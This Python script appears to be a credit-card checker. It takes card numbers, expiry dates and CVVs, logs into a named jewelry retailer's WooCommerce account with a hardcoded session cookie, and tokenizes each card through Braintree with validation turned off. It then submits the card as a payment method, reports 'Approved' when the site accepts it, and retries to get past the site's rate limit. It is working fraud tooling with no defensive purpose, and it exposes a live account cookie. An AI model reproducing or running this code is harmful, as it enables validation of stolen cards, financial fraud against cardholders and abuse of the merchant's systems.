#pylint:disable=W0404
import time
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if len(yy) == 2:
		yy = '20' + yy
	yy = int(yy)
	import re
	import base64
	import requests
	cookies = { 'wordpress_logged_in_9d69fa9242bbe322792fffd6c1f3ae71': 'moezzat8532%7C1712346212%7CsGgqbbc6CwBA9gj7TWBlR7qo0WMhQ4BYLDPtJUp0YlH%7C3a64a430eb0a8a8c1f36c72ba891305efa3b7974e388570071cd130ce9964c7f'
	}
	headers = {
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	response = requests.get('https://jewelryexchange.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	non=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
	add=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
	import requests
	cookies = { 'wordpress_logged_in_9d69fa9242bbe322792fffd6c1f3ae71': 'moezzat8532%7C1712346212%7CsGgqbbc6CwBA9gj7TWBlR7qo0WMhQ4BYLDPtJUp0YlH%7C3a64a430eb0a8a8c1f36c72ba891305efa3b7974e388570071cd130ce9964c7f'
	}
	headers = {
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	data = {
	    'action': 'wc_braintree_credit_card_get_client_token',
	    'nonce': non,
	}
	response = requests.post('https://jewelryexchange.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	no=response.json()['data']
	encoded_text = no
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	import requests
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '8d5a6285-f78b-41b9-8af2-10eedd5670ad',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	cookies = { 'wordpress_logged_in_9d69fa9242bbe322792fffd6c1f3ae71': 'moezzat8532%7C1712346212%7CsGgqbbc6CwBA9gj7TWBlR7qo0WMhQ4BYLDPtJUp0YlH%7C3a64a430eb0a8a8c1f36c72ba891305efa3b7974e388570071cd130ce9964c7f'
	}
	headers = {
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	data = [
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'visa'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', tok),
	    ('wc_braintree_device_data', '{"correlation_id":"8b03d97f183908d4aa5cf8613fbe8d3f"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
	    ('wc_braintree_paypal_payment_nonce', ''),
	    ('wc_braintree_device_data', '{"correlation_id":"8b03d97f183908d4aa5cf8613fbe8d3f"}'),
	    ('wc_braintree_paypal_amount', '0.00'),
	    ('wc_braintree_paypal_currency', 'USD'),
	    ('wc_braintree_paypal_locale', 'en_us'),
	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
	    ('woocommerce-add-payment-method-nonce', add),
	    ('_wp_http_referer', '/my-account/add-payment-method/'),
	    ('woocommerce_add_payment_method', '1'),
	]
	response = requests.post('https://jewelryexchange.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	if 'Nice! New payment method added' in response.text or 'Duplicate card' in response.text:
		msg='Approved'
	elif 'You cannot add a new payment method so soon after the previous one. Please wait for 5 seconds.' in response.text:
		msg='You cannot add a new payment method so soon after the previous one. Please wait for 5 seconds.'
	else:
		msg=re.findall(r'Status code (.*?) </li>',response.text)[0]
		while msg=='You cannot add a new payment method so soon after the previous one. Please wait for 5 seconds.':
			response = requests.post('https://jewelryexchange.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
			if 'Nice! New payment method added' in response.text or 'Duplicate card' in response.text:
				msg='Approved'
			elif 'You cannot add a new payment method so soon after the previous one. Please wait for 5 seconds.' in response.text:
				msg='You cannot add a new payment method so soon after the previous one. Please wait for 5 seconds.'
			else:
				msg=re.findall(r'Status code (.*?) </li>',response.text)[0]
	return msg